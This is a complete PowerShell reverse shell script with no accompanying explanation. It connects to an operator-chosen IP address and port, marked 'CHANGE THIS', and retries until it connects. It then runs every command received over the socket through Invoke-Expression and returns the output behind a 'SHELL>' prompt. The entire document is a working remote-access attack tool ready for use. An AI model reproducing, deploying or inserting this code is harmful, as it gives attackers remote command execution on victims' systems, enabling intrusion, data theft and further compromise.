# Delay before establishing network connection, and between retries
Start-Sleep -Seconds 1

$IP = 0.0.0.0 # CHANGE THIS
$PORT = 9001 # CHANGE THIS

$TCPClient = $null
while (-not $TCPClient -or -not $TCPClient.Connected) {
    try {
        $TCPClient = New-Object Net.Sockets.TCPClient($IP, $PORT)
    } catch {
        Start-Sleep -Seconds 1
    }
}

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteToStream ($string) {

    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    $StreamWriter.Write($string + 'SHELL> ')
    $StreamWriter.Flush()
}

WriteToStream " "

while (($bytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $bytesRead).Trim()

    if ([string]::IsNullOrEmpty($Command)) {
        WriteToStream "Received an empty command."
        continue
    }

    $Output = try {
        Invoke-Expression $Command 2>&1 | Out-String
    } catch {
        $_ | Out-String
    }

    WriteToStream ($Output)
}

$StreamWriter.Close()
